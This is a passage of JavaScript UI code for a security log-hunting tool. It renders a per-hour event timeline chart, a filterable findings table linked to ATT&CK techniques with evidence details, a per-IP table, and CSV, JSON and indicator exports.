        ${p.unknown ? `<details style="margin-top:10px"><summary class="lgh-note" style="cursor:pointer;display:inline">${fmtN(p.unknown)} lines were not recognised as any supported format. Show samples.</summary><ul class="lgh-ev">${(r.unknownSamples || []).map((u) => `<li><span class="ln">${esc((u.file ? u.file + ":" : "") + u.lineNo)}</span><span>${esc(u.text)}</span></li>`).join("")}</ul></details>` : ""}
      </div>

      <div class="lgh-card">
        <h3>Timeline (events per hour, UTC)</h3>
        <p class="lgh-note">Dark bars are events that matched a per-line rule (probes, failures, account changes). Hover a bar for counts.</p>
        ${timelineSvg(r.timeline)}
        <div class="lgh-legend"><span><i class="t"></i>All events</span><span><i class="f"></i>Flagged events</span>${st.noTimeEvents ? `<span>${fmtN(st.noTimeEvents)} events had no timestamp</span>` : ""}</div>
      </div>

      <div class="lgh-card">
        <h3>Findings (${r.findings.length})</h3>
        <div class="lgh-filters">
          <select id="lghSev"><option value="all">All severities</option><option value="critical">Critical</option><option value="high">High and up</option><option value="medium">Medium and up</option></select>
          <select id="lghSrc"><option value="all">All sources</option><option value="web">Web</option><option value="linux">Linux</option><option value="windows">Windows</option><option value="mixed">Mixed</option></select>
          <span class="lgh-note" style="margin:0">Click a row for the explanation, recommended action and evidence lines.</span>
        </div>
        <div id="lghFind"></div>
      </div>

      <div class="lgh-card">
        <h3>Per-IP view (${r.ips.length})</h3>
        <div class="lgh-filters">
          <input type="text" id="lghIpQ" placeholder="Filter by IP, user or path">
          <span class="lgh-note" style="margin:0">Sorted by worst finding, then request count. Internal means inside your configured CIDRs.</span>
        </div>
        <div id="lghIps"></div>
      </div>`;

    $("lghCopySum").addEventListener("click", () => copyText(r.summary));
    $("lghCsv").addEventListener("click", () => download("log-hunter-findings.csv", findingsToCsv(r.findings), "text/csv"));
    $("lghJson").addEventListener("click", () => download("log-hunter-report.json", reportToJson(r), "application/json"));
    const sinkFindings = toSinkFindings(r);
    attachSinkButton($("lghSink"), () => ({ findings: sinkFindings, sample: !!r.sample }), "loghunt", { dataset: r.dataset });
    $("lghIoc").addEventListener("click", () => { if (!r.iocs.external.length) { toast("No external indicator IPs in this hunt"); return; } download("log-hunter-iocs.txt", iocText(r)); });
    $("lghSev").value = sevFilter; $("lghSrc").value = srcFilter;
    $("lghSev").addEventListener("change", (e) => { sevFilter = e.target.value; renderFindings(r); });
    $("lghSrc").addEventListener("change", (e) => { srcFilter = e.target.value; renderFindings(r); });
    $("lghIpQ").value = ipFilter;
    $("lghIpQ").addEventListener("input", (e) => { ipFilter = e.target.value.trim().toLowerCase(); renderIps(r); });
    renderFindings(r); renderIps(r);
  }

  const FORMAT_LABEL = { clf: "nginx/Apache", iis: "IIS W3C", json: "JSON lines", syslog: "Linux auth", wincsv: "Windows CSV", winjson: "Windows JSON", winxml: "Windows XML" };
  const minSev = { all: 0, critical: 4, high: 3, medium: 2 };

  function renderFindings(r) {
    const list = r.findings.filter((f) => SEV_RANK[f.severity] >= minSev[sevFilter] && (srcFilter === "all" || f.source === srcFilter));
    const sorted = list.slice().sort((a, b) => {
      if (sortKey === "count") return b.count - a.count;
      if (sortKey === "time") return (a.firstTs || 0) - (b.firstTs || 0);
      if (sortKey === "technique") return a.technique.localeCompare(b.technique);
      return (SEV_RANK[b.severity] - SEV_RANK[a.severity]) || (b.count - a.count);
    });
    const box = $("lghFind");
    if (!sorted.length) { box.innerHTML = `<div class="lgh-empty">${r.findings.length ? "No findings match the filter." : "No rule fired on these logs. This says the rules did not match, not that the logs are clean."}</div>`; return; }
    const th = (k, label) => `<th><button data-sort="${k}">${label}${sortKey === k ? " v" : ""}</button></th>`;
    box.innerHTML = `<div class="lgh-tablewrap dn-scrollbox"><table>
      <thead><tr>${th("severity", "Severity")}<th>Finding</th>${th("technique", "ATT&amp;CK")}<th>Where</th>${th("count", "Count")}<th class="lgh-hide">${sortKey === "time" ? "First seen v" : '<button data-sort="time">First seen</button>'}</th></tr></thead>
      <tbody>${sorted.map((f) => `<tr class="lgh-f" data-id="${f.id}">
        <td><span class="sev-${f.severity}">${SEV[f.severity] || f.severity}</span><div class="lgh-note" style="margin:0">${esc(f.confidence)} confidence</div></td>
        <td><b>${esc(f.name)}</b><div class="lgh-note" style="margin:2px 0 0">${esc(f.detail)}</div></td>
        <td class="lgh-tech lgh-mono"><a href="https://attack.mitre.org/techniques/${esc(f.technique.replace(".", "/"))}/" target="_blank" rel="noopener">${esc(f.technique)}</a><div class="lgh-note" style="margin:0;white-space:normal">${esc(f.tactic)}</div></td>
        <td class="lgh-mono">${esc(f.ip || "")}${f.ip && (f.user || f.host) ? "<br>" : ""}${esc(f.user || "")}${f.user && f.host ? " on " : ""}${esc(f.host || "")}${!f.ip && !f.user && !f.host ? "-" : ""}</td>
        <td class="lgh-right">${fmtN(f.count)}</td>
        <td class="lgh-hide lgh-mono">${esc(fmtTs(f.firstTs))}</td></tr>`).join("")}</tbody></table></div>`;
    box.querySelectorAll("[data-sort]").forEach((b) => b.addEventListener("click", () => { sortKey = b.dataset.sort; renderFindings(r); }));
    box.querySelectorAll("tr.lgh-f").forEach((tr) => tr.addEventListener("click", () => toggleDetail(tr, r.findings.find((f) => f.id === tr.dataset.id))));
  }

  function toggleDetail(tr, f) {
    const next = tr.nextElementSibling;
    if (next && next.classList.contains("lgh-detail")) { next.remove(); return; }
    const row = document.createElement("tr"); row.className = "lgh-detail";
    const ipsMore = f.ips.length > 1 ? `<dt>IPs</dt><dd class="lgh-mono">${esc(f.ips.slice(0, 20).join(", "))}${f.ips.length > 20 ? ` and ${f.ips.length - 20} more` : ""}</dd>` : "";
    row.innerHTML = `<td colspan="6">
      <dl class="lgh-dl">
        <dt>Rule</dt><dd class="lgh-mono">${esc(f.det)} (${esc(f.id)})</dd>
        <dt>Technique</dt><dd>${esc(f.technique)} ${esc(f.techniqueName)}, tactic ${esc(f.tactic)}</dd>
        ${f.threshold ? `<dt>Threshold</dt><dd>${esc(f.threshold)}</dd>` : ""}
        <dt>Seen</dt><dd class="lgh-mono">${esc(fmtTs(f.firstTs))} to ${esc(fmtTs(f.lastTs))}</dd>
        ${ipsMore}
        <dt>What it means</dt><dd>${esc(f.explanation)}</dd>
        <dt>Recommended action</dt><dd>${esc(f.action)}</dd>
        <dt>Evidence</dt><dd>${fmtN(f.evidence.length)} of ${fmtN(f.count)} lines shown
          <ul class="lgh-ev">${f.evidence.map((e) => `<li><span class="ln">${esc((e.file ? e.file + ":" : "") + e.lineNo)}</span><span>${esc(e.text)}</span></li>`).join("")}</ul></dd>
      </dl></td>`;
    tr.after(row);
  }

  function renderIps(r) {
    const q = ipFilter;
    let list = r.ips;
    if (q) list = list.filter((d) => d.ip.toLowerCase().includes(q) || d.users.some((u) => u.toLowerCase().includes(q)) || d.topPaths.some((p) => p.value.toLowerCase().includes(q)) || d.hosts.some((h) => h.toLowerCase().includes(q)));
    const shown = list.slice(0, 300);
    const box = $("lghIps");
    if (!shown.length) { box.innerHTML = `<div class="lgh-empty">No IPs${q ? " match the filter" : " in these logs"}.</div>`; return; }
    box.innerHTML = `<div class="lgh-tablewrap dn-scrollbox"><table>
      <thead><tr><th>IP</th><th>Scope</th><th>Worst</th><th class="lgh-right">Events</th><th class="lgh-right lgh-hide">Fail / OK</th><th class="lgh-hide">First seen</th><th class="lgh-hide">Last seen</th><th>Users</th><th class="lgh-hide">Top user-agent</th><th>Top paths</th></tr></thead>
      <tbody>${shown.map((d) => `<tr>
        <td class="lgh-mono">${esc(d.ip)}${d.findings.length ? `<div class="lgh-note" style="margin:0">${esc(d.findings.join(" "))}</div>` : ""}</td>
        <td>${d.internal ? "Internal" : "External"}</td>
        <td>${d.maxSeverity ? `<span class="sev-${d.maxSeverity}">${SEV[d.maxSeverity]}</span>` : '<span class="lgh-note" style="margin:0">none</span>'}</td>
        <td class="lgh-right">${fmtN(d.count)}</td>
        <td class="lgh-right lgh-hide">${fmtN(d.fails)} / ${fmtN(d.ok)}</td>
        <td class="lgh-hide lgh-mono">${esc(fmtTs(d.first))}</td>
        <td class="lgh-hide lgh-mono">${esc(fmtTs(d.last))}</td>
        <td class="lgh-mono">${esc(d.users.slice(0, 4).join(", "))}${d.users.length > 4 ? "..." : ""}</td>
        <td class="lgh-hide lgh-note" style="margin:0">${esc(d.topUa.length ? shortUa(d.topUa[0].value) : "")}</td>
        <td class="lgh-mono">${d.topPaths.slice(0, 3).map((p) => `${esc(p.value)} (${fmtN(p.count)})`).join("<br>")}</td></tr>`).join("")}</tbody></table></div>
      ${list.length > shown.length ? `<p class="lgh-note" style="margin-top:8px">Showing ${fmtN(shown.length)} of ${fmtN(list.length)} IPs. Use the filter to narrow down; the JSON export has up to 1,000.</p>` : ""}`;
  }
}

function shortUa(ua) { return ua.length > 60 ? ua.slice(0, 57) + "..." : ua; }

// Pure SVG bar chart: one bar per hour bucket between first and last hour.
function timelineSvg(buckets) {
  if (!buckets.length) return `<div class="lgh-empty">No timestamped events to chart.</div>`;
  const first = buckets[0].ts, last = buckets[buckets.length - 1].ts;
  const hours = Math.min(Math.round((last - first) / 3600000) + 1, 24 * 14);
  const byKey = new Map(buckets.map((b) => [b.ts, b]));
  const W = 1000, H = 150, padL = 40, padB = 22, padT = 8;
  const bw = (W - padL) / hours;
  const max = Math.max(1, ...buckets.map((b) => b.total));
  const scale = (v) => (v / max) * (H - padB - padT);
  let bars = "";
  for (let i = 0; i < hours; i++) {
    const ts = first + i * 3600000;
    const b = byKey.get(ts);
    if (!b) continue;
    const x = padL + i * bw + 0.5, w = Math.max(1, bw - 1);
    const label = `${new Date(ts).toISOString().slice(5, 13).replace("T", " ")}:00 UTC: ${b.total.toLocaleString()} events, ${b.flagged.toLocaleString()} flagged (web ${b.web}, linux ${b.linux}, windows ${b.windows})`;
    bars += `<g><title>${esc(label)}</title><rect class="t" x="${x}" y="${H - padB - scale(b.total)}" width="${w}" height="${scale(b.total)}"/>` +
      (b.flagged ? `<rect class="f" x="${x}" y="${H - padB - scale(b.flagged)}" width="${w}" height="${scale(b.flagged)}"/>` : "") + `</g>`;
  }
  const ticks = Math.min(hours, 8);
  let labels = "";
  for (let t = 0; t < ticks; t++) {
    const i = Math.floor((t / Math.max(1, ticks - 1)) * (hours - 1));
    const ts = first + i * 3600000;
    const d = new Date(ts);
    labels += `<text x="${padL + i * bw + bw / 2}" y="${H - 6}" text-anchor="middle">${d.toISOString().slice(5, 10)} ${pad2(d.getUTCHours())}h</text>`;
  }
  return `<svg class="lgh-chart" viewBox="0 0 ${W} ${H}" preserveAspectRatio="none" role="img" aria-label="Events per hour">
    <text x="${padL - 6}" y="${padT + 8}" text-anchor="end">${max.toLocaleString()}</text>
    <text x="${padL - 6}" y="${H - padB}" text-anchor="end">0</text>
    <line x1="${padL}" y1="${H - padB}" x2="${W}" y2="${H - padB}" stroke="var(--line,#e6e8ee)"/>
    ${bars}${labels}</svg>`;
}
